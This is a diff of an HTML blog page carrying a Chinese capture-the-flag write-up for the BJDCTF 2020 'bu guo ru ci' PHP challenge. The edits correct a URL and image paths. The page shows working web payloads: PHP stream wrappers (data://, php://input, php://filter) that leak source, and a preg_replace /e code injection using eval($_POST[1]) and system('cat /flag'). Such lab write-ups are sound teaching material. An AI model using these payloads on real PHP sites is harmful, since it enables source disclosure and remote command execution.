@@ -80,11 +80,11 @@ if(isset($text)&amp;amp;&amp;am,">
 <p>要求：</p>
 <p>1.text内容I have a dream</p>
 <p>2.file中不能含有flag字段</p>
-<pre><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64- encode/resource=next.php</code></pre>
+<pre><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></pre>
 <p>或者：</p>
 <pre><code>?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php
 POST:I have a dream</code></pre>
-<p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/1.png" alt="1"></p>
+<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/1.png" alt="1"></p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
     <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -114,10 +114,10 @@ POST:I have a dream</code></pre>
 <p>但这里存在的问题是，GET方式传的字符串，.会被替换成_，这里采用</p>
 <pre><code>\S*=${phpinfo()}  #\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配/</code></pre>
 <pre><code>/next.php?\S*=${getflag()}&amp;cmd=system('cat /flag');</code></pre>
-<p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/2.png" alt="2"></p>
+<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/2.png" alt="2"></p>
 <pre class=" language-php"><code class="language-php">next<span class="token punctuation">.</span>php<span class="token operator">?</span>\<span class="token package">S</span><span class="token operator">*</span><span class="token operator">=</span>$<span class="token punctuation">{</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
 <span class="token constant">POST</span>：<span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="/2021/06/21/bjdctf-2020-zjctf-bu-guo-ru-ci/3.png" alt="3"></p>
+<p><img src="/BJDCTF%EF%BC%9A2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4.assets/3.png" alt="3"></p>
 <p>可以看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43622442/article/details/106018883">https://blog.csdn.net/qq_43622442/article/details/106018883</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
